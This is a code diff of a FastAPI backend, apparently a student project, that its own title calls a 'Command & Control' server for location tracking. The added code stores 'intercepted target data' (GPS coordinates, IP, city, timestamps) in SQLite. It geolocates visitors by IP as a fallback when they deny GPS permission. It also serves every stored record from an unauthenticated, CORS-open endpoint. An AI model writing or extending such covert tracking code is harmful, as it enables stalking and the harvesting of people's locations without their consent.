@@ -1,11 +1,15 @@
 import uvicorn
 from fastapi import FastAPI, Request
 from fastapi.middleware.cors import CORSMiddleware
+from pydantic import BaseModel
+from datetime import datetime
 import httpx
+import sqlite3
+import os
 
-app = FastAPI(title="Forensic Location Tracking API")
+app = FastAPI(title="Forensic Tracking Command & Control")
 
-# Enable CORS for the frontend to communicate with the backend
+# Enable CORS
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -13,45 +17,110 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+# SQLite Setup - Creates 'forensics.db' locally
+DB_PATH = "forensics.db"
 
-@app.get("/track")
-async def track_client(request: Request):
+
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS targets (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            latitude REAL,
+            longitude REAL,
+            method TEXT,
+            accuracy TEXT,
+            city TEXT,
+            country TEXT,
+            ip TEXT,
+            timestamp TEXT
+        )
+    """)
+    conn.commit()
+    conn.close()
+
+
+# Initialize the database on startup
+init_db()
+
+
+class TrackingData(BaseModel):
+    latitude: float
+    longitude: float
+    method: str
+    accuracy: str
+    city: str = "Unknown"
+    country: str = "Unknown"
+    ip: str = "Unknown"
+
+
+@app.get("/track-ip")
+async def track_ip(request: Request):
     """
-    Forensic Endpoint: Network-based Location Inference.
-    Extracts the client's public IP and queries a geolocation database.
+    Passive Inference: Extracts IP and Geolocation data.
+    Used for failover when GPS is denied.
     """
-    # In a production/viva environment, we use headers like X-Forwarded-For if behind a proxy
     client_ip = request.headers.get("x-forwarded-for") or request.client.host
-
-    # Handle localhost/development cases
-    if client_ip == "127.0.0.1" or client_ip == "::1":
-        # For local testing, we query based on the external IP of the server
-        api_url = "http://ip-api.com/json/"
-    else:
-        api_url = f"http://ip-api.com/json/{client_ip}"
+    # If on localhost, ip-api.com will return the server's public IP by default
+    api_url = (
+        f"http://ip-api.com/json/{client_ip}"
+        if client_ip not in ["127.0.0.1", "::1"]
+        else "http://ip-api.com/json/"
+    )
 
     try:
         async with httpx.AsyncClient() as client:
             response = await client.get(api_url)
-            data = response.json()
-
-        if data.get("status") == "fail":
-            return {"error": "Could not infer location from IP", "ip": client_ip}
-
-        return {
-            "latitude": data.get("lat"),
-            "longitude": data.get("lon"),
-            "city": data.get("city"),
-            "country": data.get("country"),
-            "isp": data.get("isp"),
-            "ip": data.get("query"),
-            "method": "Network-based (IP Geolocation)",
-            "accuracy_note": "Approximate, ±5–10 km (ISP Node Level)",
-            "forensic_confidence": "Medium",
-            "mode": "Passive Inference",
-        }
+            return response.json()
     except Exception as e:
-        return {"error": str(e), "method": "None"}
+        return {"status": "fail", "message": str(e)}
+
+
+@app.post("/log-target")
+async def log_target(data: TrackingData):
+    """
+    Saves intercepted target data into the local SQLite database.
+    """
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute(
+        """
+        INSERT INTO targets (latitude, longitude, method, accuracy, city, country, ip, timestamp)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+    """,
+        (
+            data.latitude,
+            data.longitude,
+            data.method,
+            data.accuracy,
+            data.city,
+            data.country,
+            data.ip,
+            timestamp,
+        ),
+    )
+    conn.commit()
+    conn.close()
+
+    return {"status": "success", "message": "Target data recorded in SQLite."}
+
+
+@app.get("/get-all-targets")
+async def get_all_targets():
+    """
+    Fetches all records for the Admin Dashboard.
+    """
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row  # Allows dictionary-like access
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM targets ORDER BY timestamp DESC")
+    rows = cursor.fetchall()
+    conn.close()
+
+    return [dict(row) for row in rows]
 
 
 if __name__ == "__main__":
